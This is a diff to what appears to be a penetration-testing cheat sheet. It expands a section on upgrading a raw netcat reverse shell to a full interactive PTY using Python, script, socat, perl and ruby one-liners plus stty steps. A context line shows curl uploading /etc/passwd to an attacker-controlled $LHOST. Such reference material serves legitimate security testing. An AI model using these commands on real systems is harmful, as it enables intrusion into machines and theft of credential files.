@@ -58,11 +58,45 @@ curl -T /etc/passwd http://$LHOST:8080/
 
 Raw netcat shells are fragile: upgrade to a full PTY immediately so you get job control, tab completion, and proper signal handling.
 
+Try each method in order until one works. After spawning the PTY, always do the `stty` dance to pass through control characters.
+
 ```bash wrap
+# Python 3
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-# CTRL+Z
+
+# Python 2
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# script (nearly always available)
+script -qc /bin/bash /dev/null
+
+# socat (best quality TTY, requires socat on target)
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane -
+
+# perl
+perl -e 'exec "/bin/bash";'
+
+# ruby
+ruby -e 'exec "/bin/bash"'
+```
+
+After spawning the PTY:
+
+```bash wrap
+# CTRL+Z to background the shell, then on attacker:
 stty raw -echo; fg
+
+# Back in the shell:
 export TERM=xterm
+export SHELL=bash
+stty rows 50 cols 200    # match your terminal dimensions
+```
+
+Get your local terminal dimensions to set them exactly:
+
+```bash wrap
+# Run on attacker before stty rows/cols
+stty size
 ```
 
 ## Polyshell
